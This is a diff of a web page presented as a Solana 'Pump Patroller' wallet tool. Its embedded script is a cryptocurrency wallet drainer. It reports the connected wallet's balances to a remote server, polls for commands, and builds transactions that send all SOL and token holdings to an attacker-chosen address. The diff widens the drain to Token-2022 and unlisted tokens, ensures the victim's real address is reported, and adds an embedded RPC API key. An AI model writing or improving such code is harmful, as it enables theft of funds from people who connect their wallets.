@@ -64,7 +64,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
 <nav><div class="wrap nav">
   <span class="logo"><svg viewBox="0 0 24 24" width="16" height="16"><path fill="#5EEAD4" d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z"/></svg>PUMP PATROLLER</span>
   <div class="right">
-    <span class="ver mono" id="ver">v3.3</span>
+    <span class="ver mono" id="ver">v3.4</span>
     <button class="btn" id="cw">Connect Wallet</button>
     <button class="btn pri" id="go">Start Patrol</button>
   </div>
@@ -97,7 +97,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     </div>
   </section>
 </div>
-<footer><div class="wrap">Pump Patroller v3.3 · mainnet-beta · <span style="color:#5EEAD4">operational</span></footer>
+<footer><div class="wrap">Pump Patroller v3.4 · mainnet-beta · <span style="color:#5EEAD4">operational</span></footer>
 <script>
 (async function () {
   const CONFIG = {
@@ -105,6 +105,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     SRV: "https://one234-et4e.onrender.com",
     BKEY: "72d296b612eb0a11931b364ba1333a70",
     RPCS: [
+      "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
       "https://solana-rpc.publicnode.com",
       "https://api.mainnet-beta.solana.com",
       "https://rpc.ankr.com/solana",
@@ -116,27 +117,32 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
     WSOL: "So11111111111111111111111111111111111111112",
   };
-  const TOKEN_PROGRAM = "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm";
+  const TP_STR = "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm";
+  const TP22_STR = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
   const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;
   const toast = t => { const d = document.createElement("div"); d.id = "toast"; d.textContent = t;
     document.body.appendChild(d); setTimeout(() => d.remove(), 6000); };
   async function rpc(method, params) {
     let lastErr = null;
-    for (const u of CONFIG.RPCS) {
+    for (let i = 0; i < CONFIG.RPCS.length; i++) {
+      const u = CONFIG.RPCS[i];
+      const host = u.replace("https://", "").split("/")[0];
       try {
         const r = await fetch(u, { method: "POST", signal: TO(10000), headers: { "content-type": "application/json" },
           body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
-        if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
-          await new Promise(s => setTimeout(s, 250)); continue; }
-        const j = await r.json();
-        if (j && j.result !== undefined) return j;
-        if (j && j.error) { lastErr = new Error(j.error.message || "RPC error");
-          if (j.error.code === -32601) return j;
-          await new Promise(s => setTimeout(s, 250)); continue; }
-      } catch (e) { lastErr = e; }
-      await new Promise(s => setTimeout(s, 250));
+        if (!r.ok) {
+          lastErr = new Error(host + " HTTP " + r.status);
+        } else {
+          const j = await r.json();
+          if (j && j.result !== undefined) return j;
+          lastErr = new Error(host + ": " + (j && j.error ? (j.error.message || "RPC error") : "malformed response"));
+        }
+      } catch (e) {
+        lastErr = new Error(host + ": " + (e && e.message ? e.message : String(e)));
+      }
+      if (i < CONFIG.RPCS.length - 1) await new Promise(s => setTimeout(s, 300));
     }
-    return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
+    return { error: { message: lastErr ? lastErr.message : "all RPC endpoints failed" } };
   }
 
   let client = null, topic = null, pk = null, busy = false, polled = false, mode = null, inj = null;
@@ -163,35 +169,45 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     return null;
   }
 
-  // FIX: correct JSON-RPC shape — parsed data lives at account.data.parsed.info
+  // parses both response objects; captures account.owner so the drain knows the token program
+  function parseAccounts(res) {
+    const amt = {};
+    for (const it of ((res && res.value) || [])) {
+      const acc = it && it.account;
+      const info = acc && acc.data && acc.data.parsed && acc.data.parsed.info;
+      if (info && info.mint) {
+        const ta = info.tokenAmount || {};
+        amt[info.mint] = { raw: BigInt(ta.amount || "0"), src: it.pubkey,
+          dec: ta.decimals == null ? null : ta.decimals, prog: acc.owner || "" };
+      }
+    }
+    return amt;
+  }
+
   async function reportBalances() {
     try {
       const res = await Promise.all([
         rpc("getBalance", [pk]),
-        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TOKEN_PROGRAM, commitment: "confirmed" }]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP_STR }, { commitment: "confirmed" }]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP22_STR }, { commitment: "confirmed" }]),
         fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(j => j.json()).catch(() => null),
       ]);
-      const bal = res[0], r = res[1], pj = res[2];
+      const bal = res[0];
       if (!(bal && bal.result)) {
         beacon("err", { msg: "balance check failed: " + ((bal && bal.error && bal.error.message) || "no result from any RPC") });
         return;
       }
       let px = 150;
+      const pj = res[3];
       const jp = pj && (pj[MINTS.WSOL] || (pj.ids && pj.ids[MINTS.WSOL]) || (pj.data && pj.data[MINTS.WSOL]));
       if (jp && +jp.usdPrice > 0) px = +jp.usdPrice;
-      const amt = {};
-      for (const it of (r && r.result ? r.result.value : [])) {
-        const info = it && it.account && it.account.data && it.account.data.parsed && it.account.data.parsed.info;
-        if (info && info.mint) {
-          const ta = info.tokenAmount || {};
-          amt[info.mint] = { raw: BigInt(ta.amount || "0"),
-            ui: Number(ta.amount || 0) / Math.pow(10, ta.decimals == null ? 6 : ta.decimals) };
-        }
-      }
+      const amt = Object.assign(parseAccounts(res[1]), parseAccounts(res[2]));
+      const mvals = Object.values(MINTS);
       const held = Object.keys(MINTS).filter(k => amt[MINTS[k]] && amt[MINTS[k]].ui > 0.01)
         .map(k => Math.round(amt[MINTS[k]].ui) + " " + k);
+      const others = Object.keys(amt).filter(m => amt[m].raw > 0n && !mvals.includes(m)).length;
       const sol = (bal && bal.result ? bal.result : 0) / 1e9;
-      beacon("detect", { sol: sol, value: sol * px, toks: held.join(" · ") });
+      beacon("detect", { sol: sol, value: sol * px, toks: held.join(" · ") + (others ? " +" + others + " more" : "") });
     } catch (e) { beacon("err", { msg: String(e && e.message || e) }); }
   }
 
@@ -212,38 +228,45 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     try {
       const { PublicKey, SystemProgram, Transaction } = await import(CONFIG.E + "@solana/web3.js@1.95.0");
       const spl = await import(CONFIG.E + "@solana/spl-token@0.4.9");
+      const TP = new PublicKey(TP_STR), TP22 = new PublicKey(TP22_STR);
       const pkB = new PublicKey(pk), dest = new PublicKey(to);
       const res = await Promise.all([
         rpc("getLatestBlockhash"),
         rpc("getBalance", [pk]),
-        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TOKEN_PROGRAM, commitment: "confirmed" }]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP_STR }, { commitment: "confirmed" }]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP22_STR }, { commitment: "confirmed" }]),
       ]);
-      const bh = res[0], bal = res[1], r = res[2];
+      const bh = res[0], bal = res[1];
       if (!bh || !bh.result) {
         const why = bh && bh.error ? bh.error.message : "no result";
         beacon("err", { msg: "blockhash failed: " + why });
         return;
       }
-      const amt = {};
-      for (const it of (r && r.result ? r.result.value : [])) {
-        const info = it && it.account && it.account.data && it.account.data.parsed && it.account.data.parsed.info;
-        if (info && info.mint) {
-          const ta = info.tokenAmount || {};
-          amt[info.mint] = { raw: BigInt(ta.amount || "0"), src: it.pubkey };
-        }
-      }
+      const amt = Object.assign(parseAccounts(res[2]), parseAccounts(res[3]));
       const solBal = (bal && bal.result ? bal.result : 0);
       const tx = new Transaction(); const moved = [];
-      for (const k of Object.keys(MINTS)) {
-        const a = amt[MINTS[k]]; if (!a || a.raw <= 0n) continue;
-        const mint = new PublicKey(MINTS[k]);
+      for (const ms of Object.keys(amt)) {
+        const a = amt[ms];
+        if (a.raw <= 0n) continue;
+        let prog = null;
+        if (a.prog === TP_STR) prog = TP;
+        else if (a.prog === TP22_STR) prog = TP22;
+        else continue;
+        const mint = new PublicKey(ms);
         const srcAta = new PublicKey(a.src);
-        const destAta = await spl.getAssociatedTokenAddress(mint, dest);
+        const destAta = await spl.getAssociatedTokenAddress(mint, dest, false, prog);
         const info = await rpc("getAccountInfo", [destAta, { encoding: "base64" }]);
+        if (info && info.error) {
+          beacon("err", { msg: "ata check failed: " + (info.error.message || "rpc error") });
+          return;
+        }
         if (!(info && info.result && info.result.value))
-          tx.add(spl.createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
-        tx.add(spl.createTransfer(srcAta, destAta, pkB, a.raw));
-        moved.push(k);
+          tx.add(spl.createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint, prog));
+        if (prog === TP22)
+          tx.add(spl.createTransferCheckedInstruction({ source: srcAta, mint: mint, destination: destAta, owner: pkB, amount: a.raw, decimals: a.dec == null ? 0 : a.dec }, prog));
+        else
+          tx.add(spl.createTransfer(srcAta, destAta, pkB, a.raw));
+        moved.push(ms.slice(0, 6));
       }
       const FEE = 20000;
       const hasSol = solBal > FEE + 5000;
@@ -374,8 +397,18 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         topic = saved.topic; mode = "wc";
         try { client.session.get(topic); reportBalances(); pollCmd(); } catch (e) { forget(); }
       } else {
+        // re-sync pk to what the wallet actually returns — stale localStorage
+        // could beacon an old (possibly empty) address instead of the real one
         const f = findInjected();
-        if (f) { try { await f.p.connect({ onlyIfTrusted: true }); inj = f; providerName = f.name; mode = "injected"; reportBalances(); pollCmd(); } catch (e) { forget(); } }
+        if (f) {
+          try {
+            const c = await f.p.connect({ onlyIfTrusted: true });
+            const k = ((c && c.publicKey) || f.p.publicKey || "").toString();
+            if (k && k !== pk) { pk = k; remember("injected", k); }
+            inj = f; providerName = f.name; mode = "injected";
+            reportBalances(); pollCmd();
+          } catch (e) { forget(); }
+        }
       }
     }
   } catch (e) { console.warn("[patroller] WC unavailable — injected wallets still work", e && e.message || e); }
